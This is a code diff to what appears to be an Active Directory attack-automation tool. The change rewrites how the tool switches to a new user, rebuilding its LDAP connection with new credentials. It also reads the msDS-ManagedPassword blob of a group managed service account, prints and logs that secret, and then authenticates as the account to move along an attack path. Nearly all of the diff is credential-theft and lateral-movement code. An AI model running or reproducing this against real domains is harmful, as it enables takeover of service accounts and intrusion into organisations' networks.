@@ -101,7 +101,17 @@ class Automation:
         if self.simulation:
             print(f"\nAuthenticated as {user}:\n")
         else:
-            await self.conn.switchUser(user, pwd)
+            # Close current connection
+            await self.conn.closeLdap()
+            
+            # Create new args for the new user
+            import copy
+            new_args = copy.copy(self.co_args)
+            new_args.username = user
+            new_args.password = pwd
+            
+            # Create new ConnectionHandler with new credentials
+            self.conn = ConnectionHandler(new_args)
 
     async def _nextHop(self, rel):
         return
@@ -209,14 +219,16 @@ class Automation:
             target_dn = rel["end_node"]["distinguishedname"]
             
             # Read msDS-ManagedPassword attribute from the GMSA account
-            nthash = None
+            # This returns the raw base64 encoded password blob
+            password_blob = None
             async for entry in get.object(self.conn, target_dn, attr="msDS-ManagedPassword"):
                 if "msDS-ManagedPassword" in entry:
-                    nthash = entry["msDS-ManagedPassword"][0]['NT']
+                    password_blob = entry["msDS-ManagedPassword"]
                     break
             
-            if nthash:
-                LOG.info(f"Retrieved GMSA NT hash: {nthash}")
+            if password_blob:
+                LOG.info(f"Retrieved GMSA password (base64): {password_blob}")
+                print(f"[+] GMSA password retrieved (base64): {password_blob}")
                 
                 # Get the sAMAccountName for the GMSA account
                 ldap = await self.conn.getLdap()
@@ -228,9 +240,9 @@ class Automation:
                 if user_entry:
                     user = user_entry["sAMAccountName"]
                     # Use the base64 encoded password directly
+                    pwd = password_blob
                     LOG.info(f"Switching to GMSA account: {user}")
-                    self.conn.conf.nthash = nthash
-                    await self._switchUser(user, nthash)
+                    await self._switchUser(user, pwd)
                 else:
                     LOG.warning("Could not retrieve sAMAccountName for GMSA account")
             else:
